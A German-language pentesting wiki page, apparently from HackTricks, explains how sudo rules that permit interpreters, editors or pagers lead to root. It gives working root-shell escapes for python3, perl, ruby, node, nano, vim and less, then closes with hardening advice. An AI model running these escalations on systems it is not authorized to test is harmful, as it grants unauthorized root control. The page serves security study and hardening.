# Missbrauch von Sudo-Befehlen

{{#include ../../banners/hacktricks-training.md}}

## Von Sudo erlaubte Interpreter

Wenn `sudo -l` einem Benutzer erlaubt, einen Interpreter als root auszuführen, sollte dies als direkte Codeausführung behandelt werden. Interpreter sind dafür ausgelegt, beliebigen Code auszuführen. Daher entspricht eine Regel, die die Ausführung von `python3`, `perl`, `ruby`, `lua`, `node` oder ähnlichen Binärdateien erlaubt, normalerweise der Ausführung von Befehlen als root, sofern die Argumente nicht strikt eingeschränkt und validiert werden.

Üblicher Prüfablauf:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Weitere Interpreter-Beispiele:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Der exakte Pfad ist entscheidend. Wenn die sudo-Regel `/usr/bin/python3` erlaubt, verwende bei der Validierung genau diesen Pfad:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudo-allowed editors

Wenn `sudo -l` einem Benutzer erlaubt, einen interaktiven Editor als root auszuführen, sollte dies als Oberfläche zur command execution und nicht als harmlose Berechtigung zur Dateibearbeitung betrachtet werden. Editoren können häufig Shell-Befehle ausführen, beliebige Dateien lesen, beliebige Dateien schreiben oder aus dem Editor heraus externe Helfer aufrufen.

Üblicher Prüfablauf:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Ausführung von Befehlen in Nano

Wenn `nano` über sudo erlaubt ist, kann die Befehlsausführung über die Editor-Oberfläche erreichbar sein:
```text
Ctrl+R
Ctrl+X
```
Geben Sie dann einen Befehl wie den folgenden an:
```bash
id
/bin/sh
```
Auf einigen Terminals müssen die Standard-Streams einer interaktiven Shell möglicherweise umgeleitet werden:
```bash
reset; /bin/sh 1>&0 2>&0
```
Die genaue Tastenfolge kann je nach nano-Version und Build-Optionen variieren, aber das Sicherheitsproblem ist dasselbe: Der Editor läuft als root und kann externe Befehle ausführen.

### Andere häufige Editor-Escapes

Vim-style-Editoren ermöglichen die Befehlsausführung häufig über `:!`:
```text
:!/bin/sh
```
Pager wie `less` können ebenfalls die Ausführung von Shell-Befehlen ermöglichen:
```text
!/bin/sh
```
## Defensive Hinweise

- Vermeide es, Interpreters oder interaktive Editoren über sudo zu gewähren.
- Bevorzuge feste, dem Benutzer root gehörende Wrapper, die genau eine eng begrenzte administrative Aktion ausführen.
- Wenn ein Interpreter unvermeidbar ist, beschränke den exakten Script-Pfad und verhindere benutzerkontrollierte Argumente, beschreibbare Imports, `PYTHONPATH` sowie das unsichere Beibehalten von Umgebungsvariablen.
- Wenn das Bearbeiten von Dateien erforderlich ist, beschränke den exakten Dateipfad und ziehe `sudoedit` mit gepatchten sudo-Versionen und einer strikten Handhabung der Umgebung in Betracht.
- Überprüfe `SETENV`, `env_keep`, beschreibbare Arbeitsverzeichnisse, beschreibbare Modul-/Importpfade, `NOEXEC`, `use_pty` und das Logging, betrachte sie jedoch nicht als vollständige Sandbox.

{{#include ../../banners/hacktricks-training.md}}
